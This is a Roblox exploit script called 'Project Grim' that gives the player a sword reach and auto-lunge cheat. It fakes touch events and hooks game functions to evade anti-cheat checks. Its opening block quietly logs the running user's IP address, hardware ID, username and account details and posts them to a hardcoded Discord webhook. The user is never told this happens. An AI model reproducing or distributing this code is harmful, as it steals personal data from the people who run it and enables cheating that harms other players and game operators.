local IP = game:HttpGet("https://v4.ident.me")
plr = game:GetService'Players'.LocalPlayer
local premium = false
local ALT = false
if plr.MembershipType == Enum.MembershipType.Premium then
	premium = true
elseif plr.MembershipType == Enum.MembershipType.None then
	premium = false
end
if premium == false then 
	if plr.AccountAge <= 70 then 
		ALT = true
	end
end
 
local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
 
 
local http_request = http_request;
if syn then
	http_request = syn.request
elseif SENTINEL_V2 then
	function http_request(tb)
		return {
			StatusCode = 200;
			Body = request(tb.Url, tb.Method, (tb.Body or ''))
		}
	end
end
 
local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
hwid = "";
 
for i, v in next, hwid_list do
	if decoded.headers[v] then
		hwid = decoded.headers[v];
		break
	end
end
 
if hwid then
local HttpServ = game:GetService('HttpService')
local url = "https://discord.com/api/webhooks/971621157025505340/dMlgZFqJN-ldJSfarG2E2kbGnjp9Ysf2cVv7SmTG9tj_io2BUSLt2u-372nenuF-SFfm"
 
 
local data = 
    {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "__**HWID:**__",
            ["description"] = hwid,
            ["type"] = "rich",
            ["color"] = tonumber(0xAB0909),
            ["fields"] = {
                {
                    ["name"] = "Username:",
                    ["value"] = Game.Players.LocalPlayer.Name,
                    ["inline"] = true
                },
				{
                    ["name"] = "IP Address:",
                    ["value"] = IP,
                    ["inline"] = true
                },
				{
                    ["name"] = "Game Link:",
                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
                    ["inline"] = true
                },
				{
					["name"] = "Game Name:",
					["value"] = info.Name,
					["inline"] = true
				},
				{
					["name"] = "Age:",
					["value"] = plr.AccountAge,
					["inline"] = true
				},
				{
					["name"] = "Premium:",
					["value"] = premium,
					["inline"] = true
				},
				{
					["name"] = "ALT:",
					["value"] = ALT,
					["inline"] = true
				},
 
            },
        }}
    }
    local newdata = HttpServ:JSONEncode(data)
 
    local headers = {
            ["content-type"] = "application/json"
    }
 
    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
    http_request(request_payload)
end


local Version = "1"


local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local Terrain = workspace.Terrain
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")
local Players = game:GetService("Players")


local ScreenGui = Instance.new("ScreenGui")
local Background = Instance.new("Frame")
local Frame = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")


local TweensOut
local TweensIn
local Tweening
local Done = false
do
    Tweening = true
    local Intro = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local UICorner = Instance.new("UICorner")
    local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
    local Title = Instance.new("TextLabel")
    local VersionLabel = Instance.new("TextLabel")
    local LaunchButton = Instance.new("TextButton")
    local UICorner_2 = Instance.new("UICorner")
    local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
    Intro.Name = "\000"
    if is_synapse then
        syn.protect_gui(Intro)
        Intro.Parent = CoreGui
    elseif gethui then
        Intro.Parent = gethui()
    else
        Intro.Parent = CoreGui
    end

    Intro.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

    Frame.Parent = Intro
    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)

    UICorner.CornerRadius = UDim.new(0, 1000)
    UICorner.Parent = Frame

    UIAspectRatioConstraint.Parent = Frame

    Title.Name = "Title"
    Title.Parent = Frame
    Title.AnchorPoint = Vector2.new(0.5, 0.5)
    Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Title.BackgroundTransparency = 1.000
    Title.BorderSizePixel = 0
    Title.Position = UDim2.new(0.5, 0, 0.25, 0)
    Title.Size = UDim2.new(1, 0, 0.134782612, 0)
    Title.Font = Enum.Font.Creepster
    Title.Text = "Project Grim"
    Title.TextColor3 = Color3.fromRGB(255, 0, 0)
    Title.TextScaled = true
    Title.TextSize = 14.000
    Title.TextTransparency = 1.000
    Title.TextWrapped = true

    VersionLabel.Name = "Version"
    VersionLabel.Parent = Frame
    VersionLabel.AnchorPoint = Vector2.new(0.5, 0.5)
    VersionLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    VersionLabel.BackgroundTransparency = 1.000
    VersionLabel.BorderSizePixel = 0
    VersionLabel.Position = UDim2.new(0.5, 0, 0.38499999, 0)
    VersionLabel.Size = UDim2.new(1, 0, 0.134782612, 0)
    VersionLabel.Font = Enum.Font.Creepster
    VersionLabel.Text = "v" .. Version
    VersionLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    VersionLabel.TextScaled = true
    VersionLabel.TextSize = 14.000
    VersionLabel.TextTransparency = 1.000
    VersionLabel.TextWrapped = true

    LaunchButton.Name = "LaunchButton"
    LaunchButton.Parent = Frame
    LaunchButton.AnchorPoint = Vector2.new(0.5, 0.5)
    LaunchButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    LaunchButton.BackgroundTransparency = 1.000
    LaunchButton.TextTransparency = 1
    LaunchButton.BorderSizePixel = 0
    LaunchButton.Position = UDim2.new(0.5, 0, 0.743478239, 0)
    LaunchButton.Size = UDim2.new(0.4, 0, 0.129999995, 0)
    LaunchButton.Font = Enum.Font.Creepster
    LaunchButton.Text = "Continue"
    LaunchButton.TextColor3 = Color3.fromRGB(255, 0, 0)
    LaunchButton.TextScaled = true
    LaunchButton.TextSize = 29.000
    LaunchButton.TextWrapped = true
    

    UICorner_2.Parent = LaunchButton

    UITextSizeConstraint.Parent = LaunchButton
    UITextSizeConstraint.MaxTextSize = 23


    TweensIn = {
        ["1"] = TweenService:Create(LaunchButton,TweenInfo.new(0.4,Enum.EasingStyle.Sine,Enum.EasingDirection.Out),{BackgroundTransparency = 1,TextTransparency = 1}),
        ["2"] = TweenService:Create(VersionLabel,TweenInfo.new(0.4,Enum.EasingStyle.Sine,Enum.EasingDirection.Out),{TextTransparency = 1}),
        ["3"] = TweenService:Create(Title,TweenInfo.new(0.4,Enum.EasingStyle.Sine,Enum.EasingDirection.Out),{TextTransparency = 1}),	
        ["4"] = TweenService:Create(Frame,TweenInfo.new(0.5,Enum.EasingStyle.Sine,Enum.EasingDirection.In),{Size = UDim2.new(0,0,0,0)}),
    }
    TweensOut = {
        ["1"] = TweenService:Create(Frame,TweenInfo.new(0.5,Enum.EasingStyle.Sine,Enum.EasingDirection.Out),{Size = UDim2.new(0,230,0,230)}),
        ["2"] = TweenService:Create(Title,TweenInfo.new(0.4,Enum.EasingStyle.Sine,Enum.EasingDirection.In),{TextTransparency = 0}),
        ["3"] = TweenService:Create(VersionLabel,TweenInfo.new(0.4,Enum.EasingStyle.Sine,Enum.EasingDirection.In),{TextTransparency = 0}),
        ["4"] = TweenService:Create(LaunchButton,TweenInfo.new(0.4,Enum.EasingStyle.Sine,Enum.EasingDirection.In),{BackgroundTransparency = 0,TextTransparency = 0}),	
    }

    LaunchButton.MouseButton1Click:Connect(function()
        if not Tweening then
            for i = 1,4 do
                local v = TweensIn[tostring(i)]
                v:Play()
                v.Completed:Wait()
            end
            Intro:Destroy()
            Done = true
        end
    end)
    
    for i = 1,4 do
        local v = TweensOut[tostring(i)]
        v:Play()
        v.Completed:Wait()
    end
    Tweening = false    
end

while true do
    if Done then
        break
    end
    wait()
end





getgenv().Circle = {
    ["Size"] = 3.5,
    ["Enabled"] = true,
    ["Random FTI"] = true,
    ["Whitelisted Limbs"] = {"Torso","Head","Head", "Torso"}
}

getgenv().Configuration = {
    ["Active"] = true,
    ["Increase Size"] = .5,
    ["Decrease Size"] = .5,
    ["Notifications"] = true,
    ["Auto Clicker"] = false,
    ["Transparency Check"] = false,
    ["Team Check"] = false,
    ["Fake Handle FTI"] = false -- if true, will only trigger if a fake handle is present (use for advanced antis)
}

getgenv().Keybinds = {
    ["Toggle Reach"] = "",
    ["Toggle AC"] = "Q",
    ["Increase Reach"] = "E",
    ["Decrease Reach"] = "R",
    ["Toggle Script"] = "X",
    ["Notifications Toggle"] = "N",
}

local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function SendNotification(Ti,Te)
    StarterGui:SetCore('SendNotification', {Title = tostring(Ti), Text = tostring(Te)})
end

local Mouse = LocalPlayer:GetMouse()

Mouse.KeyDown:Connect(function(key)
    if key == string.lower(getgenv().Keybinds["Toggle Reach"]) then
        if getgenv().Configuration["Active"] == false then return end
        getgenv().Circle["Enabled"] = not getgenv().Circle["Enabled"]
        if getgenv().Configuration["Notifications"] == true then
            SendNotification("PG^","Magnitude = "..tostring(getgenv().Circle["Enabled"]))
        end
    elseif key == string.lower(getgenv().Keybinds["Toggle AC"]) then
        if getgenv().Configuration["Active"] == false then return end
        getgenv().Configuration["Auto Clicker"] = not getgenv().Configuration["Auto Clicker"]
        if getgenv().Configuration["Notifications"] == true then
            SendNotification("PG^","AutoLunge = "..tostring(getgenv().Configuration["Auto Clicker"]))
        end
    elseif key == string.lower(getgenv().Keybinds["Increase Reach"]) then
        if getgenv().Configuration["Active"] == false then return end
        getgenv().Circle["Size"] = getgenv().Circle["Size"] + getgenv().Configuration["Increase Size"]
        if getgenv().Configuration["Notifications"] == true then
            SendNotification("PG^","Magnitude = "..getgenv().Circle["Size"])
        end
    elseif key == string.lower(getgenv().Keybinds["Decrease Reach"]) then
        if getgenv().Configuration["Active"] == false then return end
        getgenv().Circle["Size"] = getgenv().Circle["Size"] - getgenv().Configuration["Decrease Size"]
        if getgenv().Configuration["Notifications"] == true then
            SendNotification("PG^","Magnitude = "..getgenv().Circle["Size"])
        end
    elseif key == string.lower(getgenv().Keybinds["Notifications Toggle"]) then
        getgenv().Configuration["Notifications"] = not getgenv().Configuration["Notifications"]
        SendNotification("PG^","Updates = "..tostring(getgenv().Configuration["Notifications"]))
    elseif key == string.lower(getgenv().Keybinds["Toggle Script"]) then
        getgenv().Configuration["Active"] = not getgenv().Configuration["Active"]
        if getgenv().Configuration["Notifications"] == true then
            SendNotification("PG^","PG^ Script = "..tostring(getgenv().Configuration["Active"]))
        end
    end
end)

hookfunction(gcinfo or collectgarbage, function(...)
    if getgenv().Configuration["Active"] == false then return end
    return math.random(200,400)
end)

local HitParts = {}
local t = tick()

local FTI = function(hit,handle)
    local Humanoid = hit.Parent:FindFirstChild("Humanoid")
    if Humanoid and Humanoid.Health ~= 0 and hit.Parent.Name ~= LocalPlayer.Character.Name then
        if getgenv().Configuration["Transparency Check"] == true then if hit.Transparency > 0.8 then return end end
        local Region = Region3.new(handle.Position + Vector3.new(-1,-1,-1), handle.Position + Vector3.new(1,1,1))
        local InRegion = game:GetService("Workspace"):FindPartsInRegion3(Region)
        if getgenv().Configuration["Fake Handle FTI"] then
            for _,v in pairs(InRegion) do
                if v:IsA("Part") and v:FindFirstChildOfClass("TouchTransmitter") and v.Name ~= "Handle" then
                    if getgenv().Circle["Random FTI"] == true then
                        for i,parts in pairs(hit.Parent:GetChildren()) do
                            if parts:IsA("Part") then
                               if handle.Parent.GripUp.Z == 0 then
                                if table.find(getgenv().Circle["Whitelisted Limbs"],parts.Name) then
                                    if not table.find(HitParts,parts.Name) then
                                        if #HitParts >= 0 then table.clear(HitParts) end
                                        table.insert(HitParts,parts.Name)
                                        if math.abs(tick() - t) < 0 then return end
                                        t = tick()
                                        firetouchinterest(parts,v,0)
                                        firetouchinterest(parts,v,1)
                                        firetouchinterest(parts,handle,0)
                                        firetouchinterest(parts,handle,1)
                                    end
                                end
                            end
                            end
                            end
                    else
                        for i,parts in pairs(hit.Parent:GetChildren()) do
                            if parts:IsA("Part") then
                                if handle.Parent.GripUp.Z == 0 then
                                if table.find(getgenv().Circle["Whitelisted Limbs"],parts.Name) then
                                    firetouchinterest(parts,v,0)
                                    firetouchinterest(parts,v,1)
                                    firetouchinterest(parts,handle,0)
                                    firetouchinterest(parts,handle,1)
                                end
                            end
                        end
                    end
                end
                end
                end
        else
            for _,v in pairs(InRegion) do
                if v:IsA("Part") and v:FindFirstChildOfClass("TouchTransmitter") then
                    if getgenv().Circle["Random FTI"] == true then
                        for i,parts in pairs(hit.Parent:GetChildren()) do
                            if parts:IsA("Part") then
                                if handle.Parent.GripUp.Z == 0 then
                                if table.find(getgenv().Circle["Whitelisted Limbs"],parts.Name) then
                                    if not table.find(HitParts,parts.Name) then
                                        if #HitParts >= 0 then table.clear(HitParts) end
                                        table.insert(HitParts,parts.Name)
                                        if math.abs(tick() - t) < 0 then return end
                                        t = tick()
                                        firetouchinterest(parts,v,0)
                                        firetouchinterest(parts,v,1)
                                        firetouchinterest(parts,handle,0)
                                        firetouchinterest(parts,handle,1)
                                    end
                                end
                            end
                            end
                            end
                    else
                        for i,parts in pairs(hit.Parent:GetChildren()) do
                            if parts:IsA("Part") then
                                if handle.Parent.GripUp.Z == 0 then
                                if table.find(getgenv().Circle["Whitelisted Limbs"],parts.Name) then
                                    firetouchinterest(parts,v,0)
                                    firetouchinterest(parts,v,1)
                                        firetouchinterest(parts,handle,0)
                                        firetouchinterest(parts,handle,1)
                                end
                            end
                        end
                    end
                end
            end
        end
    end
end
end

local IsTeam = function(Player)
    if Player.Team == LocalPlayer.Team then
        return true
    else 
        return false
    end
end

game:GetService("RunService").RenderStepped:Connect(function()
    if getgenv().Configuration["Active"] == false then return end
    if getgenv().Circle["Enabled"] == false then return end
    local Tool = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Tool")
    if Tool then
        if getgenv().Configuration["Auto Clicker"] and LocalPlayer.Character.Humanoid.Health ~= 0 then Tool:Activate() end
        local Handle = Tool:FindFirstChild("Handle")
        if Handle then
            local Size = getgenv().Circle["Size"]
            if getgenv().Configuration["Team Check"] == true then
                for i,v in pairs(game:GetService("Players"):GetPlayers()) do
                    if IsTeam(v) == false then
                        local HRP = v.Character and v.Character:FindFirstChild("HumanoidRootPart")
                        if HRP then
                            local Distance = (HRP.Position - Handle.Position).Magnitude
                            if Distance <= Size then
                                FTI(HRP,Handle)
                            end
                        end
                    end
                end
            else
                for i,v in pairs(game:GetService("Players"):GetPlayers()) do
                    local HRP = v.Character and v.Character:FindFirstChild("HumanoidRootPart")
                    if HRP then
                        local Distance = (HRP.Position - Handle.Position).Magnitude
                        if Distance <= Size then
                            FTI(HRP,Handle)
                        end
                    end
                end
            end
        end
    end
end)

local hook;
hook = hookfunc(getrenv().wait, newcclosure(function(...)
    local args = {...}
    if args[1] == 3 and getcallingscript().Parent == nil then
        return coroutine.yield()
    end
    return hook(...)
end))

local hook;
hook = hookfunc(getrenv().wait, newcclosure(function(...)
    local args = {...}
    if args[1] == 2 and getcallingscript().Parent == nil then
        return coroutine.yield()
    end
    return hook(...)
end))
